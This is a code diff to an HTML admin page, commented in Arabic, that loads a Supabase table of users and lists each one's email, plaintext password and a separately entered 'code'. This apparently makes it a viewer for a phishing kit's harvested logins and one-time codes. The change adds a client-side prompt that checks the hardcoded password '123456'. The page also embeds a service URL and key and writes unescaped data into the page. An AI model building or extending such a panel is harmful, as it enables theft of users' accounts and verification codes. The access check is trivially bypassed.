@@ -67,44 +67,51 @@
   </table>
 
   <script>
-    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
-    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
-    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    // حماية الصفحة بكلمة سر بسيطة لك فقط
+    const adminPass = prompt("أدخل كلمة سر الآدمن للدخول:");
+    if (adminPass !== "123456") { // يمكنك تغيير 123456 بأي كلمة سر تختارها
+      alert("كلمة السر خاطئة!");
+      window.location.href = "/";
+    } else {
+      const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
+      const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
+      const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    async function loadUsersData() {
-      const { data, error } = await supabaseClient
-        .from('users_data')
-        .select('*')
-        .order('id', { ascending: false });
+      async function loadUsersData() {
+        const { data, error } = await supabaseClient
+          .from('users_data')
+          .select('*')
+          .order('id', { ascending: false });
 
-      const loading = document.getElementById('loading');
-      const table = document.getElementById('dataTable');
-      const tableBody = document.getElementById('tableBody');
+        const loading = document.getElementById('loading');
+        const table = document.getElementById('dataTable');
+        const tableBody = document.getElementById('tableBody');
 
-      if (error) {
-        loading.innerText = 'حدث خطأ أثناء جلب البيانات: ' + error.message;
-        return;
+        if (error) {
+          loading.innerText = 'حدث خطأ أثناء جلب البيانات: ' + error.message;
+          return;
+        }
+
+        loading.style.display = 'none';
+        table.style.display = 'table';
+
+        tableBody.innerHTML = '';
+        data.forEach(user => {
+          const row = `
+            <tr>
+              <td>${user.id || ''}</td>
+              <td>${user.email || ''}</td>
+              <td>${user.password || ''}</td>
+              <td><strong>${user.code || 'لم يدخل الكود بعد'}</strong></td>
+              <td>${user.created_at ? new Date(user.created_at).toLocaleString('ar-EG') : ''}</td>
+            </tr>
+          `;
+          tableBody.innerHTML += row;
+        });
       }
 
-      loading.style.display = 'none';
-      table.style.display = 'table';
-
-      tableBody.innerHTML = '';
-      data.forEach(user => {
-        const row = `
-          <tr>
-            <td>${user.id || ''}</td>
-            <td>${user.email || ''}</td>
-            <td>${user.password || ''}</td>
-            <td><strong>${user.code || 'لم يدخل الكود بعد'}</strong></td>
-            <td>${user.created_at ? new Date(user.created_at).toLocaleString('ar-EG') : ''}</td>
-          </tr>
-        `;
-        tableBody.innerHTML += row;
-      });
+      loadUsersData();
     }
-
-    loadUsersData();
   </script>
 </body>
 </html>
